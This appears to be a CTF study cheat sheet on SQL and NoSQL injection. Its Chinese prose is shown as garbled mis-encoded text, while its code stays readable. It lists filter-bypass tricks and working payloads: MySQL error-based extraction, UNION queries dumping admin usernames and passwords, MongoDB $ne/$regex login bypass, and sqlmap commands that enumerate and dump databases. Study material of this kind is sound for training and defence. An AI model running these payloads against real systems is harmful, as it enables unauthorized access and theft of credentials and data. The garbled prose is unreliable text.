# ğŸ§© **ã€é¢˜å‹å½’çº³ï¼šSQLæ³¨å…¥ (SQL Injection)ã€‘**

---

## **A. SQLæ³¨å…¥ (SQL Injection)**

### 1. ç±»å‹

* **GET/POST å‚æ•°æ³¨å…¥**: é€šè¿‡URLå‚æ•°æˆ–HTTPè¯·æ±‚ä½“ä¸­çš„å‚æ•°æ³¨å…¥
* **åŸºäºé”™è¯¯çš„æ³¨å…¥**: åˆ©ç”¨æ•°æ®åº“é”™è¯¯ä¿¡æ¯å›æ˜¾
* **å¸ƒå°”ç›²æ³¨**: æ ¹æ®é¡µé¢å“åº”å·®å¼‚åˆ¤æ–­SQLè¯­å¥çœŸå‡
* **æ—¶é—´ç›²æ³¨**: æ ¹æ®SQLè¯­å¥æ‰§è¡Œæ—¶é—´å·®å¼‚åˆ¤æ–­
* **UNIONæŸ¥è¯¢æ³¨å…¥**: åˆ©ç”¨UNIONè¯­å¥åˆå¹¶æŸ¥è¯¢ç»“æœè¿›è¡Œæ•°æ®æ³„éœ²
* **NoSQLæ³¨å…¥**: é’ˆå¯¹MongoDBç­‰NoSQLæ•°æ®åº“çš„æ³¨å…¥

### 2. è§£é¢˜è¾“å‡ºæ€è·¯

1. è¯†åˆ«ç”¨æˆ·è¾“å…¥ç‚¹ï¼ˆGET/POSTå‚æ•°ã€Cookieã€Headerç­‰ï¼‰
2. æ„é€ åŸºç¡€payloadï¼ˆå¦‚å•å¼•å· `'`ï¼‰æµ‹è¯•æ³¨å…¥ç‚¹
3. åˆ¤æ–­æ³¨å…¥ç±»å‹ï¼ˆé”™è¯¯å›æ˜¾ã€å¸ƒå°”ã€æ—¶é—´ã€Unionç­‰ï¼‰
4. æ ¹æ®æ³¨å…¥ç±»å‹æ„é€ ç›¸åº”payloadè¿›è¡Œåˆ©ç”¨
5. è¯»å–æ•æ„Ÿæ•°æ®ï¼ˆå¦‚flagã€ç”¨æˆ·å‡­æ®ï¼‰
6. è¾“å‡ºè·å–åˆ°çš„flag

### 3. å…³æ³¨ç‚¹

* **è¾“å…¥éªŒè¯æœºåˆ¶**: æ˜¯å¦æœ‰WAFã€è¿‡æ»¤è§„åˆ™ï¼ˆå¦‚å…³é”®è¯é»‘åå•ã€é•¿åº¦é™åˆ¶ï¼‰
* **æ•°æ®åº“ç±»å‹**: MySQLã€PostgreSQLã€SQLiteã€MongoDBç­‰ï¼Œè¯­æ³•å·®å¼‚
* **æ³¨å…¥ä½ç½®**: WHEREå­å¥ã€SELECTå­å¥ã€ORDER BYå­å¥ã€å‡½æ•°å‚æ•°ç­‰
* **å“åº”å·®å¼‚**: æ˜¯å¦æœ‰é”™è¯¯ä¿¡æ¯ã€é¡µé¢å†…å®¹å˜åŒ–ã€å“åº”æ—¶é—´å˜åŒ–
* **æƒé™**: å½“å‰æ•°æ®åº“ç”¨æˆ·æƒé™ï¼Œèƒ½å¦æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€è¯»å†™æ–‡ä»¶
* **è®¤è¯çŠ¶æ€**: æ˜¯å¦éœ€è¦å…ˆé€šè¿‡è®¤è¯æ‰èƒ½è®¿é—®æ³¨å…¥ç‚¹

### 4. é€šç”¨

#### é€šç”¨æ­¥éª¤

* åŸºç¡€é—­åˆæµ‹è¯•ï¼š`'`, `"` (åˆ¤æ–­å­—ç¬¦ä¸²é—­åˆ)
* é”™è¯¯æ³¨å…¥æµ‹è¯•ï¼š`' OR 1=1 -- `, `' AND 1=2 -- ` (åˆ¤æ–­æ˜¯å¦æŠ¥é”™)
* çˆ†å­—æ®µæ•°ï¼š`' UNION SELECT 1,2,3... -- ` (UNIONæ³¨å…¥æ—¶)

#### æ­¥éª¤å¸¸ç”¨

* **SQLMapè‡ªåŠ¨åŒ–**: `sqlmap -u "target_url" --batch`
* **ç»•è¿‡å…³é”®è¯è¿‡æ»¤**: åˆ©ç”¨å¤§å°å†™ (`Or 1=1`)ã€ç¼–ç  (`%27`)ã€åŒå†™ (`UNIUNIONON`)
* **ç»•è¿‡æƒé™**: å…ˆè®¤è¯æˆ–å¯»æ‰¾æœªè®¤è¯çš„æ³¨å…¥ç‚¹
* **ç»•è¿‡ç‰¹å®šè¿‡æ»¤**: å¦‚åˆ©ç”¨`||`æ‹¼æ¥ç»•è¿‡å…³é”®è¯æ›¿æ¢ï¼Œåˆ©ç”¨`order by`å‡½æ•°æ‰§è¡ŒæŠ¥é”™æ³¨å…¥

### 5. æ–¹æ³•è®º

* **æ¢æµ‹ -> è¯†åˆ« -> åˆ©ç”¨ -> æå–**
* ä¼˜å…ˆåˆ©ç”¨è‡ªåŠ¨åŒ–å·¥å…·ï¼ˆå¦‚sqlmapï¼‰è¿›è¡Œæ¢æµ‹å’ŒåŸºç¡€åˆ©ç”¨
* æ‰‹åŠ¨æ„é€ payloadç»•è¿‡ç‰¹å®šçš„è¿‡æ»¤å’Œé™åˆ¶
* æ ¹æ®æ•°æ®åº“ç±»å‹å’Œæ³¨å…¥ç±»å‹é€‰æ‹©æœ€æœ‰æ•ˆçš„payload

### 6. å¯å‘æ€§é—®é¢˜

* å‚æ•°æ˜¯å¦‚ä½•è¢«æ‹¼æ¥åˆ°SQLæŸ¥è¯¢ä¸­çš„ï¼Ÿ
* æ˜¯å¦æœ‰è¾“å…¥è¿‡æ»¤æˆ–å‚æ•°åŒ–æŸ¥è¯¢ï¼Ÿ
* å“åº”ä¸­æ˜¯å¦åŒ…å«æ•°æ®åº“é”™è¯¯ä¿¡æ¯ï¼Ÿ
* æ˜¯å¦å¯ä»¥æ³¨å…¥åˆ°UNIONæŸ¥è¯¢çš„ä½ç½®ï¼Ÿ
* æ˜¯å¦å­˜åœ¨è®¤è¯å£å’ï¼Œå¯¼è‡´æ³¨å…¥ç‚¹æ— æ³•ç›´æ¥è®¿é—®ï¼Ÿ

### 7. ç»•è¿‡æ‰‹æ³•

* **å¤§å°å†™ç»•è¿‡**: `unIoN SeLeCt 1,2,3`
* **URLç¼–ç ç»•è¿‡**: `%27` ä»£æ›¿ `'`
* **åŒå†™ç»•è¿‡**: `UNIUNIONON SELSELECTECT`
* **å­—ç¬¦ä¸²æ‹¼æ¥**: `1' || 'a'` (SQLite), `CONCAT('a', 'b')`
* **æ³¨é‡Šç¬¦**: `-- -`, `#`, `/**/`
* **å‡½æ•°æ‰§è¡Œ**: `updatexml()`, `extractvalue()` (MySQLæŠ¥é”™æ³¨å…¥)
* **åˆ©ç”¨ç‰¹å®šè¯­æ³•**: å¦‚`' OR 1=1 -- `ç»•è¿‡ç®€å•æ¡ä»¶åˆ¤æ–­

### 8. å…¸å‹ payload

#### åŸºäºé”™è¯¯çš„æ³¨å…¥ (MySQL):

```sql
' OR updatexml(1,concat(0x7e,(SELECT flag FROM flag LIMIT 1),0x7e),1) -- -
' OR extractvalue(1,concat(0x7e,(SELECT flag FROM flag LIMIT 1),0x7e)) -- -
```

#### UNIONæŸ¥è¯¢æ³¨å…¥:

```sql
' UNION SELECT 1, flag, 3 FROM flag -- -
' UNION SELECT username, password FROM admins -- -
```

#### ç»•è¿‡å…³é”®è¯è¿‡æ»¤ (SQLite):

```sql
# å‡è®¾ OR/AND è¢«è¿‡æ»¤
# åˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥
' || ' OR 1=1 --  # å¦‚æœ ' è¢«é—­åˆ
# æˆ–è€…åˆ©ç”¨ 1=1 æ°¸çœŸæ¡ä»¶ç»“åˆå…¶ä»–è¯­æ³•
' ORDER BY 1 -- # è§¦å‘å‡½æ•°æ‰§è¡Œ
' ORDER BY updatexml(1,concat(0x7e,(SELECT flag FROM flag LIMIT 1),0x7e),1) -- - # æŠ¥é”™æ³¨å…¥
```

#### NoSQLæ³¨å…¥ (MongoDB):

```javascript
// å‡è®¾åç«¯ä½¿ç”¨ MongoDB
// ç»•è¿‡è®¤è¯
{"username": {"$ne": null}, "password": {"$ne": null}}
// æˆ–
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
// æˆ–å°è¯•ç›´æ¥æ³¨å…¥å‘½ä»¤ï¼ˆå¯èƒ½å¯¼è‡´500é”™è¯¯ï¼‰
{"username": {"$where": "return true"}}
```

#### SQLMap å‘½ä»¤ç¤ºä¾‹:

```bash
# æ£€æµ‹æ³¨å…¥ç‚¹
sqlmap -u "http://target.com/page.php?id=1" --batch
# æšä¸¾æ•°æ®åº“
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
# æšä¸¾æŒ‡å®šæ•°æ®åº“çš„è¡¨
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables --batch
# Dumpè¡¨æ•°æ®
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump --batch
# æ‰§è¡ŒSQLè¯­å¥ (éœ€è¦æƒé™)
sqlmap -u "http://target.com/page.php?id=1" --sql-query "SELECT flag FROM flag" --batch
```